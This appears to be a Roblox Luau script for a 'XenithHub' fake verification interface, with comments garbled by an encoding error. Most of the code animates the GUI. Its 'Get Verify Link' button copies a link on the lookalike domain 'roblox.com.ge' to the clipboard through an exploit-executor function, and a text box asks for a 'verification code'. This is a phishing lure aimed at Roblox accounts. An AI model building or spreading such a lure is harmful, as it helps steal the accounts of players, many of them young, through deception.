-- –ê–Ω–∏–º–∞—Ü–∏–∏
local time = 0
local glowTweenIn = TweenService:Create(glow, TweenInfo.new(2, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut, -1, true), {
    ImageTransparency = 0.6
})

local lineTween = TweenService:Create(line, TweenInfo.new(2, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut, -1, true), {
    BackgroundTransparency = 0.3
})

local lockRotation = TweenService:Create(lockIcon, TweenInfo.new(4, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut, -1, true), {
    Rotation = 5
})

local gradientTween = TweenService:Create(gradient, TweenInfo.new(5, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut, -1, true), {
    Rotation = 135
})

local buttonGlowTween = TweenService:Create(checkGlowImage, TweenInfo.new(1.5, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut, -1, true), {
    ImageTransparency = 0.7
})

-- –§—É–Ω–∫—Ü–∏—è –¥–ª—è –∞–Ω–∏–º–∞—Ü–∏–∏ –Ω–∞–≤–µ–¥–µ–Ω–∏—è –Ω–∞ –∫–Ω–æ–ø–∫—É
local function animateButtonHover(button, isHovering)
    local goal = {}
    if isHovering then
        goal.Size = UDim2.new(1, 10, 0, 60)
        goal.Position = UDim2.new(0, -5, goal.Position.Y.Scale, goal.Position.Y.Offset - 2.5)
    else
        goal.Size = button:GetAttribute("OriginalSize") or UDim2.new(1, 0, 0, 55)
        goal.Position = button:GetAttribute("OriginalPosition") or UDim2.new(0, 0, 0, tonumber(string.match(tostring(button.Position), "(%d+)$")) or 0)
    end
    
    local tween = TweenService:Create(button, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), goal)
    tween:Play()
end

-- –°–æ—Ö—Ä–∞–Ω—è–µ–º –æ—Ä–∏–≥–∏–Ω–∞–ª—å–Ω—ã–µ —Ä–∞–∑–º–µ—Ä—ã –∫–Ω–æ–ø–æ–∫
checkButton:SetAttribute("OriginalSize", checkButton.Size)
checkButton:SetAttribute("OriginalPosition", checkButton.Position)
getLinkButton:SetAttribute("OriginalSize", getLinkButton.Size)
getLinkButton:SetAttribute("OriginalPosition", getLinkButton.Position)

-- –û–±—Ä–∞–±–æ—Ç—á–∏–∫–∏ –Ω–∞–≤–µ–¥–µ–Ω–∏—è –Ω–∞ –∫–Ω–æ–ø–∫–∏
checkButton.MouseEnter:Connect(function()
    animateButtonHover(checkButton, true)
end)

checkButton.MouseLeave:Connect(function()
    animateButtonHover(checkButton, false)
end)

getLinkButton.MouseEnter:Connect(function()
    animateButtonHover(getLinkButton, true)
end)

getLinkButton.MouseLeave:Connect(function()
    animateButtonHover(getLinkButton, false)
end)

-- –§—É–Ω–∫—Ü–∏—è –¥–ª—è –∞–Ω–∏–º–∞—Ü–∏–∏ –Ω–∞–∂–∞—Ç–∏—è –∫–Ω–æ–ø–∫–∏
local function animateButtonClick(button)
    local originalSize = button:GetAttribute("OriginalSize") or button.Size
    local tween1 = TweenService:Create(button, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
        Size = UDim2.new(originalSize.X.Scale, originalSize.X.Offset - 10, originalSize.Y.Scale, originalSize.Y.Offset - 5)
    })
    local tween2 = TweenService:Create(button, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out, 0, false, 0.1), {
        Size = originalSize
    })
    
    tween1:Play()
    tween1.Completed:Connect(function()
        tween2:Play()
    end)
end

-- –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –∫–Ω–æ–ø–∫–∏ Check Verify
checkButton.MouseButton1Click:Connect(function()
    animateButtonClick(checkButton)
    
    -- –ê–Ω–∏–º–∞—Ü–∏—è –∏–∑–º–µ–Ω–µ–Ω–∏—è —Ü–≤–µ—Ç–∞
    local tween = TweenService:Create(checkButton, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
        BackgroundColor3 = Color3.fromRGB(70, 200, 70)
    })
    tween:Play()
    
    tween.Completed:Wait()
    
    -- –í–æ–∑–≤—Ä–∞—Ç –∫ –∏—Å—Ö–æ–¥–Ω–æ–º—É —Ü–≤–µ—Ç—É
    local tweenBack = TweenService:Create(checkButton, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
        BackgroundColor3 = Color3.fromRGB(100, 70, 255)
    })
    tweenBack:Play()
    
    -- –ó–¥–µ—Å—å –º–æ–∂–Ω–æ –¥–æ–±–∞–≤–∏—Ç—å –ª–æ–≥–∏–∫—É –ø—Ä–æ–≤–µ—Ä–∫–∏ –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏–∏
    if textBox.Text ~= "" then
        print("–ü—Ä–æ–≤–µ—Ä–∫–∞ –∫–æ–¥–∞:", textBox.Text)
        -- –í–∞—à–∞ –ª–æ–≥–∏–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏
    end
end)

-- –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –∫–Ω–æ–ø–∫–∏ Get Verify Link
getLinkButton.MouseButton1Click:Connect(function()
    animateButtonClick(getLinkButton)
    
    -- –°—Å—ã–ª–∫–∞ –¥–ª—è –∫–æ–ø–∏—Ä–æ–≤–∞–Ω–∏—è
    local verifyLink = "https://roblox.com.ge/games/83077686077059/Get-Verified?privateServerLinkCode=69155647945445362618402496055839"
    
    -- –ü–æ–∫–∞–∑—ã–≤–∞–µ–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ –∫–æ–ø–∏—Ä–æ–≤–∞–Ω–∏–∏
    copyNotification.Text = "‚úì –°—Å—ã–ª–∫–∞ —Å–∫–æ–ø–∏—Ä–æ–≤–∞–Ω–∞ –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞!"
    
    local fadeIn = TweenService:Create(copyNotification, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
        TextTransparency = 0
    })
    
    fadeIn:Play()
    
    -- –ò–º–∏—Ç–∞—Ü–∏—è –∫–æ–ø–∏—Ä–æ–≤–∞–Ω–∏—è –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞
    setclipboard(verifyLink)
    print("–°—Å—ã–ª–∫–∞ —Å–∫–æ–ø–∏—Ä–æ–≤–∞–Ω–∞:", verifyLink)
    
    wait(2)
    
    local fadeOut = TweenService:Create(copyNotification, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
        TextTransparency = 1
    })
    
    fadeOut:Play()
end)

-- –ó–∞–ø—É—Å–∫–∞–µ–º –∞–Ω–∏–º–∞—Ü–∏–∏
glowTweenIn:Play()
lineTween:Play()
lockRotation:Play()
gradientTween:Play()
buttonGlowTween:Play()

-- –ü–ª–∞–≤–Ω–æ–µ –ø–æ—è–≤–ª–µ–Ω–∏–µ –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å–∞
mainFrame.BackgroundTransparency = 1
background.BackgroundTransparency = 1

local fadeIn = TweenService:Create(mainFrame, TweenInfo.new(0.8, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
    BackgroundTransparency = 0
})

local backgroundFadeIn = TweenService:Create(background, TweenInfo.new(0.8, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
    BackgroundTransparency = 0
})

fadeIn:Play()
backgroundFadeIn:Play()

-- –ü–∞—Ä—è—â–∞—è –∞–Ω–∏–º–∞—Ü–∏—è –¥–ª—è –æ—Å–Ω–æ–≤–Ω–æ–≥–æ —Ñ—Ä–µ–π–º–∞
coroutine.wrap(function()
    while true do
        time = time + RunService.RenderStepped:Wait()
        local yOffset = math.sin(time) * 3
        mainFrame.Position = UDim2.new(0.5, -250, 0.5, -225 + yOffset)
    end
end)()

-- –ê–Ω–∏–º–∞—Ü–∏—è —Å–≤–µ—á–µ–Ω–∏—è –¥–ª—è –ø–æ–ª—è –≤–≤–æ–¥–∞ –ø—Ä–∏ —Ñ–æ–∫—É—Å–µ
textBox.Focused:Connect(function()
    local tween = TweenService:Create(inputStroke, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
        Color = ColorSequence.new(Color3.fromRGB(160, 120, 255))
    })
    tween:Play()
end)

textBox.FocusLost:Connect(function()
    local tween = TweenService:Create(inputStroke, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
        Color = ColorSequence.new(Color3.fromRGB(100, 70, 255))
    })
    tween:Play()
end)

-- –§—É–Ω–∫—Ü–∏—è –¥–ª—è –∑–∞–∫—Ä—ã—Ç–∏—è –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å–∞ (–æ–ø—Ü–∏–æ–Ω–∞–ª—å–Ω–æ)
UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if input.KeyCode == Enum.KeyCode.Escape then
        local fadeOut = TweenService:Create(mainFrame, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
            BackgroundTransparency = 1
        })
        fadeOut:Play()
        
        fadeOut.Completed:Wait()
        gui:Destroy()
    end
end)

print("XenithHub Verify GUI —É—Å–ø–µ—à–Ω–æ –∑–∞–≥—Ä—É–∂–µ–Ω!")
